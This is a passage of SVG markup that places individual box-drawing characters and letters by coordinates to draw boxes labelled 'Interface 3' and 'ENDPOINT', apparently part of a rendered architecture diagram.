<text text-anchor='middle' x='664' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='180' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='672' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='436' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='672' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='580' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='672' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='740' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='804' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='820' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='672' y='836' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='672' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='688' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='212' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='696' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='612' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='696' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='696' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='212' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='704' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='612' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='704' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='704' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='212' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='712' y='244' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='712' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='308' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='712' y='340' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='712' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='404' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='712' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='612' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='712' y='644' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='712' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='708' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='712' y='740' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='712' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='712' y='804' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='712' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='712' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='212' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='720' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='612' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='720' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='720' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='212' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='728' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='612' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='728' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='728' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='212' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='736' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='612' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='736' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='736' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='212' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='744' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='276' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='744' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='372' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='744' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='612' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='744' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='676' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='744' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='772' fill='currentColor' style='font-size:1em'>E</text>
<text text-anchor='middle' x='744' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='744' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='212' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='752' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='276' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='752' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='372' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='752' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='612' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='752' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='676' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='752' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='772' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='752' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='752' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='212' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='760' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='276' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='760' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='372' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='760' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='612' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='760' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='676' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='760' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='772' fill='currentColor' style='font-size:1em'>D</text>
<text text-anchor='middle' x='760' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='760' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='276' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='768' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='372' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='768' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='676' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='768' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='772' fill='currentColor' style='font-size:1em'>P</text>
<text text-anchor='middle' x='768' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='768' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='212' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='776' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='276' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='776' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='372' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='776' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='612' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='776' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='676' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='776' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='772' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='776' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='776' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='276' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='784' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='372' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='784' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='676' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='784' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='772' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='784' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='784' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='276' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='792' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='372' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='792' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='676' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='792' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='772' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='792' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='792' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='276' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='800' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='372' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='800' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='800' y='676' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='800' y='708' fill='currentColor' style='font-size:1em'>─</text>
